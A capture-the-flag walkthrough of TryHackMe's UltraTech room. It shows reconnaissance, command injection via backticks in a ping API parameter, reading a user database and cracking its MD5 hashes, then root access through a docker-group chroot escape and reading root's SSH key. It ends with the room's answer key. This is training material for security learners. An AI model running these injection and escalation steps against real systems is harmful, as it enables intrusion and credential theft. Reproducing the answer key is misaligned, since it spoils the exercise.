
# UltraTech CTF Walkthrough

UltraTech is a vulnerable server based on real-life on TryHackMe.com<br />
<br />
<i>URL: https://tryhackme.com/room/ultratech<br />
THM Difficulty: Medium<br />
My Difficulty: Medium<br />
Target IP: 10.10.39.165<br />
AttackBox IP: 10.10.157.51<br />
</i>

# Recon

For our first command we will use rustscan, rustscan will scan all of the ports in around 3 seconds.<br />
```shell
rustscan -a 10.10.39.165
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT1.png?raw=true)<br />
Now we know which ports are open, I run an Nmap scan with the flags -sV and -sC to find the service versions and to run default scripts on the open ports.<br />
```shell
nmap -sV -sC -p21,22,8081,31331 10.10.39.165
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT2.png?raw=true)<br />
We see 4 ports open running different services! Let's have a look into some of the services and see what we can find.<br />

## FTP Service Recon

We're going to start with FTP, let's try to connect via FTP with the anonymous account <br />
```shell
ftp 10.10.39.165
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT3.png?raw=true)<br />
No luck there, let's move on for now.<br />

## Node.js Service Recon

We've moved onto Node.js recon, let's head over to the website:<br />
```shell
http://10.10.39.165:8081
```
Let's use gobuster to brute-force directories to see if there's anything interesting! <br />
```shell
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.39.165:8081/
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT5.png?raw=true)<br />

Interesting... Let's check out the directory /auth<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT6.png?raw=true)<br />
This looks interesting... But we don't have any login details... Let's move on for now.<br />

## HTTP Service Recon

We're going to do the same steps as we did for the Node.js service recon, let's try to bruteforce some directories with gobuster<br />
```shell
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.39.165:31331/
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT4.png?raw=true)<br />
Nothing really of interest, there's an e-mail address on the contact of the bottom of the webpage, we'll save it for now.<br />

Let's see if they have a robots.txt file using the address below<br />
```shell
http://10.10.39.165:31331/robots.txt
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT7.png?raw=true)<br />
Interesting... Let's have a look at the sitemap below<br />
```shell
http://10.10.39.165:31331/utech_sitemap.txt
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT8.png?raw=true)<br />
After having a look at all of the pages we find a login page at:<br />
```shell
http://10.10.39.165:31331/partners.html
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT9.png?raw=true)<br />
Not really helpful to us since we still don't have any login information and default credentials didn't work. Let's continue looking at the other directories we got from gobuster. <br />

I came across an interesting file in one of the directories gobuster picked up<br />
```shell
http://10.10.39.165:31331/js/api.js
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT11.png?raw=true)<br />
This file was also in the source of the login page partners.html <br />

## Looking for vulnerabilities

Let's take a look at the api.js file
```Javascript
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();
```
We know a couple of things now, this file api.js uses the Node.js service as it's API and it's used to process the logins from /partners.html on the HTML service.<br />

There are a couple of lines in this file that made me interested, can you see them?<br />

```Javascript
const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
```
- We know that the API URL is the Node.js service http://10.10.39.165:8081<br />
- We can see that it's sending a HTTP GET request<br />
- It looks like it's performing a ping to confirm if the API is down/up so the user can login.<br />

Let's take a look at the following URL:<br />
```shell
http://10.10.39.165:8081/ping?ip=10.10.39.165
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT12.png?raw=true)<br />
Very interesting! This looks like the same output from a ping request sent from a Linux machine... Maybe vulnerable to command injection?<br />

## Exploiting Command Injection
What if we changed the request to something else? Let's see what happens when we try to add a list command at the end<br />
```shell
http://10.10.39.165:8081/ping?ip=10.10.39.165;ls
```
Hm, it didn't work. Let's try that again with backticks.<br />
```shell
http://10.10.39.165:8081/ping?ip=10.10.39.165;`ls`
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT13.png?raw=true)<br />
Success! We were able to list a file "utech.db.sqlite", let's have a look at the database file.<br />
```shell
http://10.10.39.165:8081/ping?ip=10.10.39.165;`cat utech.db.sqlite`
```
Interesting... We've found 2 users(r00t, admin) along with their password hashes!<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT15.png?raw=true)<br />
Let's try to crack the hashes and see what we can do with them! We know the hashes are MD5. 
I used an online decryption service instead of waiting, I have the password now let's try to login...<br />

## SSH Service Recon
We're going to try logging into the SSH service we found earlier.<br />
```shell
ssh r00t@10.10.39.165
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT14.png?raw=true)<br />
Success! Let's try going into /root and getting the last flag!
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT16.png?raw=true)<br />
I thought we were already root, I guess not. I try the id command which provides a general overview of the users privilege level and group memberships.<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT17.png?raw=true)<br />
Interesting, we're apart of the docker group. I may of not noticed this for about 30 minutes... Maybe we can exploit this?<br />

## Privilege Escalation

Let's try to exploit docker to get root privileges, I first checked https://gtfobins.github.io/gtfobins/docker/<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT18.png?raw=true)<br />
Awesome! Let's give the command a try and see if we get root privileges. We first need to change from alpine to bash.<br />
```shell
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT19.png?raw=true)<br />
Success! We're now root, let's get the last flag. We need to find the root users SSH key.<br />
```shell
cd /root/.ssh && cat id_rsa
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT20.png?raw=true)<br />

## Questions & Answers

Question 1:<br />
**Which software is using the port 8081** Node.js<br />

Question 2:<br />
**Which other non-standard port is used?** 31331<br />

Question 2:<br />
**Which software is using this port?** Apache<br />

Question 2:<br />
**Which GNU/Linux distribution seems to be used?** Ubuntu<br />

Question 2:<br />
**The software using the port 8081 is a REST api, how many of its routes are used by the web application? ** 2<br />

Question 2:<br />
**There is a database lying around, what is the filename?** utech.db.sqlite<br />

Question 2:<br />
**What is the first user's password hash?** a0c52799563c7c7b76c1e7543a32<br />

Question 2:<br />
**What is the password associated with this hash?** n100906<br />

Question 2:<br />
**What are the first 9 characters of the root users private SSH key?** MIIEogIBA<br />

### Farewell, I hope you all enjoyed this write-up!
